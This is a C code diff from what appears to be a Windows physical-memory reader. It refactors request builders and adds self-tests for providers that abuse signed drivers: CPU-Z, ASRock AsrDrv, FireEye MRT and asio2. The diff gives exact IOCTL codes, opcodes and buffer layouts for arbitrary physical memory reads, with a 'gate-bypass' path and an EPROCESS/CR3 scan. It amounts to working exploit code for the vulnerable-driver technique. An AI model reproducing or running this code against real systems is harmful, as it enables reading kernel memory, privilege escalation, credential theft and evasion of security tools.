@@ -108,6 +108,13 @@ static int read_mock(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
 // IOCTL 0x9C402708: input {u32 address; u32 expected_first_dword_of_page};
 // output {u32 value}. Driver maps (address & ~0xFFF), requires the page's
 // first dword to equal expected (r->aux), then returns the dword at address.
+static int cpuz_build_request(uint64_t pa, uint32_t expected, uint32_t out[2]) {
+    if (!out) return 0;
+    out[0] = (uint32_t)pa;
+    out[1] = expected;
+    return 1;
+}
+
 static int read_cpuz(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
     if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
     uint8_t *out = (uint8_t *)buf;
@@ -118,8 +125,7 @@ static int read_cpuz(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
         uint32_t in[2];
         uint32_t outv[2] = { 0, 0 };
         DWORD ret = 0;
-        in[0] = (uint32_t)cur;
-        in[1] = r->aux;
+        if (!cpuz_build_request(cur, r->aux, in)) return 0;
         if (!DeviceIoControl(r->dev, 0x9C402708u, in, sizeof(in), outv, sizeof(outv), &ret, NULL))
             return 0;
         uint32_t chunk = 4 - (page_off & 3);
@@ -180,15 +186,21 @@ static int asr_encrypt(const asr_cmd *cmd, BYTE **out_buf, DWORD *out_len) {
     return 1;
 }
 
+static int asrdrv_build_read_cmd(uint64_t pa, uint32_t size, void *buf, asr_cmd *cmd) {
+    if (!cmd || !buf || !size) return 0;
+    memset(cmd, 0, sizeof(*cmd));
+    cmd->opcode = 0x22E808u;                 // OPCODE_READ_PHYSMEM
+    cmd->args.q[0] = pa;
+    cmd->args.d[2] = size;                   // length
+    cmd->args.d[3] = 0;                      // byte granularity
+    cmd->args.q[2] = (UINT64)(uintptr_t)buf; // driver writes to this user buffer
+    return 1;
+}
+
 static int read_asrdrv(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
     if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
     asr_cmd cmd;
-    memset(&cmd, 0, sizeof(cmd));
-    cmd.opcode = 0x22E808u;                 // OPCODE_READ_PHYSMEM
-    cmd.args.q[0] = pa;
-    cmd.args.d[2] = size;                   // length
-    cmd.args.d[3] = 0;                      // byte granularity
-    cmd.args.q[2] = (UINT64)(uintptr_t)buf; // driver writes to this user buffer
+    if (!asrdrv_build_read_cmd(pa, size, buf, &cmd)) return 0;
     BYTE *in = NULL;
     DWORD inlen = 0;
     if (!asr_encrypt(&cmd, &in, &inlen)) return 0;
@@ -202,14 +214,20 @@ static int read_asrdrv(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size)
 // ---- 取数层 provider: FireEye/fekern MRT (SYSTEM-only ACL) ----
 // MRT_IOCTL_READ_PHYSICALMEMORY 0x70F8800C: input 16B {u64 PA; u32 size; u32 flags};
 // output = size bytes (MmCopyMemory(..., MM_COPY_MEMORY_PHYSICAL)).
+static int mrt_build_request(uint64_t pa, uint32_t size, uint8_t out[16]) {
+    if (!out || !size) return 0;
+    memset(out, 0, 16);
+    *(uint64_t *)(out + 0) = pa;
+    *(uint32_t *)(out + 8) = size;
+    *(uint32_t *)(out + 12) = 0;
+    return 1;
+}
+
 static int read_mrt(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
     if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
     uint8_t in[16];
     DWORD ret = 0;
-    memset(in, 0, sizeof(in));
-    *(uint64_t *)(in + 0) = pa;
-    *(uint32_t *)(in + 8) = size;
-    *(uint32_t *)(in + 12) = 0;
+    if (!mrt_build_request(pa, size, in)) return 0;
     return DeviceIoControl(r->dev, 0x70F8800Cu, in, sizeof(in), buf, size, &ret, NULL) ? 1 : 0;
 }
 
@@ -899,6 +917,27 @@ static int selftest_mock(void) {
                    *(uint64_t *)(asio2_req + 0x08) == 0x12345000ull &&
                    *(uint64_t *)(asio2_req + 0x18) == 0;
     check("取数层(fetcher)", "asio2 map request layout (gate-bypass PE)", ok_asio2);
+
+    // other provider request layouts (offline): cpuz / mrt / asrdrv
+    uint32_t czreq[2];
+    int ok_cz = cpuz_build_request(0x12345678, 0xDEADBEEF, czreq) &&
+                czreq[0] == 0x12345678 && czreq[1] == 0xDEADBEEF;
+    check("取数层(fetcher)", "cpuz request layout (addr/expected)", ok_cz);
+    uint8_t mrq[16];
+    int ok_mr = mrt_build_request(0x10000000, 0x1000, mrq) &&
+                *(uint64_t *)(mrq + 0) == 0x10000000ull &&
+                *(uint32_t *)(mrq + 8) == 0x1000 &&
+                *(uint32_t *)(mrq + 12) == 0;
+    check("取数层(fetcher)", "mrt request layout (PA/size/flags)", ok_mr);
+    asr_cmd acmd;
+    void *dummy = (void *)(uintptr_t)0x1234;
+    int ok_asr = asrdrv_build_read_cmd(0x10000000, 0x200, dummy, &acmd) &&
+                 acmd.opcode == 0x22E808u &&
+                 acmd.args.q[0] == 0x10000000ull &&
+                 acmd.args.d[2] == 0x200 &&
+                 acmd.args.d[3] == 0 &&
+                 acmd.args.q[2] == (UINT64)(uintptr_t)dummy;
+    check("取数层(fetcher)", "asrdrv read command layout (opcode/args)", ok_asr);
 
     // 定位层 alone (physical EPROCESS scan, no kernel reader)
     uint64_t located_cr3 = 0, eproc = 0;
